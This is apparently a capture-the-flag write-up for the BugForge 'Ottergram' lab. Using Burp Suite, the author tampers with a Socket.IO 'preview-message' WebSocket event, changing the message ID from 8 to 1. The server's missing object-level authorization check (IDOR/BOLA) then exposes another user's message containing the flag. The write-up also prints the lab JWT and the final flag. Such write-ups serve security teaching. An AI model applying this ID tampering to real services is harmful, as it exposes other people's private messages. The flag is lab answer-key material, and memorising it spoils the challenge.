# BugForge — Ottergram

## Challenge

**Ottergram — WebSockets are fun.**

The objective was to investigate the application's WebSocket communication and identify a vulnerability that allows access to a message that should not be accessible to the current user.

---

## 1. Open the Application

Open the Ottergram BugForge lab in Firefox and log in to the provided account.

Use **Burp Suite** as the proxy so that the application's HTTP and WebSocket traffic can be inspected.

---

## 2. Inspect HTTP History

Open:

```text
Burp Suite
→ Proxy
→ HTTP history
```

While loading/interacting with the application, look for requests containing:

```text
/socket.io/
```

The application was using Socket.IO.

One of the responses contained:

```text
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Cache-Control: no-store
Content-Type: text/plain; charset=UTF-8

0{"sid":"-E99luuuBIa09_h5AAAF","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":20000,"maxPayload":1000000}
```

---

## 3. Identify the Socket.IO Connection

The response indicates an Engine.IO/Socket.IO connection.

Important information:

```text
sid
-E99luuuBIa09_h5AAAF

upgrades
websocket

pingInterval
25000

pingTimeout
20000

maxPayload
1000000
```

The important clue was:

```text
"upgrades":["websocket"]
```

This indicated that the application could communicate through a WebSocket connection.

---

## 4. Find the Socket.IO Requests

Three relevant requests appeared in HTTP history.

### Socket.IO polling POST

```http
POST /socket.io/?EIO=4&transport=polling&t=3obth286&sid=ylyz7AwsVMSHF5ujAAAB HTTP/2
```

The request body contained:

```text
40{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJmYXNoaWwiLCJpYXQiOjE3ODkzODE2NTN9.0OrvHMnBDU1FWbqVlNZlqoV4PUAmFtRCszF2cnTQxos"}
```

### Socket.IO polling GET

```http
GET /socket.io/?EIO=4&transport=polling&t=3obtixuw&sid=ylyz7AwsVMSHF5ujAAAB HTTP/2
```

### WebSocket upgrade

```http
GET /socket.io/?EIO=4&transport=websocket&sid=ylyz7AwsVMSHF5ujAAAB HTTP/2
```

The WebSocket request contained:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: ...
```

This confirmed that the application was using a Socket.IO WebSocket connection.

---

## 5. Inspect the JWT

The Socket.IO connection contained a JWT:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The decoded payload contained:

```json
{
  "id": 4,
  "username": "fashil",
  "iat": 1789381653
}
```

Therefore, the current authenticated user was:

```text
User ID: 4
Username: fashil
```

The JWT itself was not modified. Instead, the investigation focused on the WebSocket events and whether the server properly authorized requested message IDs.

---

## 6. Inspect WebSocket History

Open:

```text
Burp Suite
→ Proxy
→ WebSockets history
```

After interacting with the application, several Socket.IO messages appeared.

The interesting messages were:

```text
42["new-message",{"messageId":8,"senderUsername":"fashil","senderId":4}]
```

```text
42["message-preview",{"messageId":8,"preview":"Test"}]
```

```text
42["preview-message",8]
```

---

## 7. Understand the Socket.IO Messages

Socket.IO event messages commonly begin with:

```text
42
```

The format is approximately:

```text
42["event-name",data]
```

In this case:

```text
42["preview-message",8]
```

means that the client is requesting a preview for:

```text
messageId = 8
```

The server responds with an event such as:

```text
42["message-preview",{
    "messageId":8,
    "preview":"Test"
}]
```

This suggested that the client was directly supplying the message ID to the server.

That is a potential **IDOR/BOLA** attack surface.

---

## 8. Send the WebSocket Request to Repeater

The WebSocket request was selected from:

```text
Burp
→ Proxy
→ WebSockets history
```

The WebSocket connection was then opened/selected in:

```text
Burp
→ Repeater
```

The WebSocket Repeater interface was initially a little tricky to select because several WebSocket connections were available.

After selecting the newest WebSocket connection from the Proxy source, the WebSocket messages could be tested.

---

## 9. Test the Message ID

The original request was:

```text
42["preview-message",8]
```

Because the server was accepting the message ID from the client, the ID was changed.

Instead of:

```text
42["preview-message",8]
```

the request was changed to:

```text
42["preview-message",1]
```

The request was sent through the active WebSocket connection.

---

## 10. Analyze the Response

The server returned:

```text
42["message-preview",{"messageId":1,"preview":"bug{JidJ12Hj7A0QzX4aOJMKok9GmJA3m0Y6} Hey! I loved your recent otter post! Where did you take that photo?"}]
```

The important part was:

```text
bug{JidJ12Hj7A0QzX4aOJMKok9GmJA3m0Y6}
```

The server returned message ID `1` even though the authenticated user was user ID `4`.

This demonstrated that the server did not properly verify whether the requested message belonged to the current user.

---

## 11. Vulnerability

The vulnerability is an **IDOR/BOLA (Insecure Direct Object Reference / Broken Object Level Authorization)** in the WebSocket message-preview functionality.

The vulnerable functionality was:

```text
42["preview-message",MESSAGE_ID]
```

The application trusted the client-supplied `MESSAGE_ID` without properly checking authorization.

For example:

```text
42["preview-message",8]
```

returned the user's own message.

Changing it to:

```text
42["preview-message",1]
```

returned another message containing the flag.

---

## 12. Final Flag

```text
bug{JidJ12Hj7A0QzX4aOJMKok9GmJA3m0Y6}
```

---

## Attack Flow

The complete attack chain was:

```text
Open Ottergram
      ↓
Proxy traffic through Burp Suite
      ↓
Find /socket.io/
      ↓
Identify Socket.IO / WebSocket connection
      ↓
Open Proxy → WebSockets history
      ↓
Observe:
42["preview-message",8]
      ↓
Identify client-controlled message ID
      ↓
Send WebSocket connection to Repeater
      ↓
Change:
42["preview-message",8]

to:

42["preview-message",1]
      ↓
Server returns message ID 1
      ↓
Authorization check is missing
      ↓
Flag revealed
```

## Key Takeaways

* `42` indicates a Socket.IO event packet.
* `preview-message` was an application-specific WebSocket event.
* The message ID was controlled by the client.
* The server failed to enforce object-level authorization.
* Changing the message ID allowed access to another message.
* The flag was contained in the unauthorized message preview.

## Flag

`bug{JidJ12Hj7A0QzX4aOJMKok9GmJA3m0Y6}`
